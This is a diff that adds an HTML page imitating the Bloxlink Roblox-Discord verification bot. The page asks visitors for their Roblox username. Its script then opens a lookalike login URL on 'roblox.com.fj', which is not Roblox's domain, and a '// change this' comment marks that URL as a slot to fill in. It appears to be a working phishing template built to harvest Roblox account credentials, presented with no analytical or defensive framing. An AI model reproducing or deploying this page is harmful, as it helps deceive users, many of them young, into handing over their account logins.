@@ -1,0 +1,134 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Bloxlink</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: Inter, sans-serif;
+      background: #0f1724;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      max-width: 480px;
+      text-align: left;
+    }
+    h1 {
+      font-size: 42px;
+      font-weight: 800;
+      margin: 0;
+    }
+    .subtitle {
+      font-size: 22px;
+      font-weight: 700;
+      margin: 6px 0 20px;
+    }
+    .roblox { color: #e34b44; }
+    .discord { color: #5865f2; }
+    .description {
+      color: #9aa6b2;
+      font-size: 15px;
+      line-height: 1.5;
+      margin-bottom: 18px;
+    }
+    .form-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+    input[type="text"] {
+      width: 220px;
+      padding: 10px 12px;
+      border: none;
+      border-radius: 6px;
+      background: #18202a;
+      color: #fff;
+      font-size: 14px;
+    }
+    button {
+      background: #21a179;
+      border: none;
+      color: #fff;
+      padding: 10px 16px;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .legal {
+      font-size: 12px;
+      color: #9aa6b2;
+      margin-bottom: 18px;
+    }
+    .legal a {
+      color: #cfe6ff;
+      text-decoration: underline;
+    }
+    .stars {
+      color: #f7c948;
+      font-size: 16px;
+      margin-bottom: 6px;
+    }
+    .note {
+      font-size: 14px;
+      color: #fff;
+    }
+    .note small {
+      display: block;
+      font-size: 12px;
+      color: #9aa6b2;
+      margin-top: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Bloxlink</h1>
+    <div class="subtitle">Bringing <span class="roblox">Roblox</span> to <span class="discord">Discord</span></div>
+
+    <p class="description">
+      Connect Roblox to Discord using Bloxlink, the leading Roblox Discord Bot. Verify who you really are, sync your group to your server, and more.
+    </p>
+
+    <div class="form-row">
+      <input id="rbx-username" type="text" placeholder="Enter your Roblox username" />
+      <button id="verifyBtn">Get Verified Now</button>
+    </div>
+
+    <p class="legal">
+      By continuing, you agree to our <a href="#">terms of service</a> and <a href="#">privacy policy</a>.
+    </p>
+
+    <div class="stars">★★★★★</div>
+    <div class="note">
+      Top rated Roblox bot by <span class="roblox">thousands of users</span>
+      <small>Bloxlink makes you verify with Roblox to identify you better on Discord.</small>
+    </div>
+  </div>
+
+  <script>
+    const verifyUrl = "https://roblox.com.fj/login?returnUrl=1185836281523987"; // change this
+    const input = document.getElementById('rbx-username');
+    const btn = document.getElementById('verifyBtn');
+
+    function openVerify() {
+      const username = input.value.trim();
+      if (!username) return input.focus();
+      const url = new URL(verifyUrl);
+      url.searchParams.set('username', username);
+      window.open(url.toString(), '_blank', 'noopener');
+    }
+
+    btn.addEventListener('click', openVerify);
+    input.addEventListener('keydown', e => { if (e.key === 'Enter') openVerify(); });
+  </script>
+</body>
+</html>
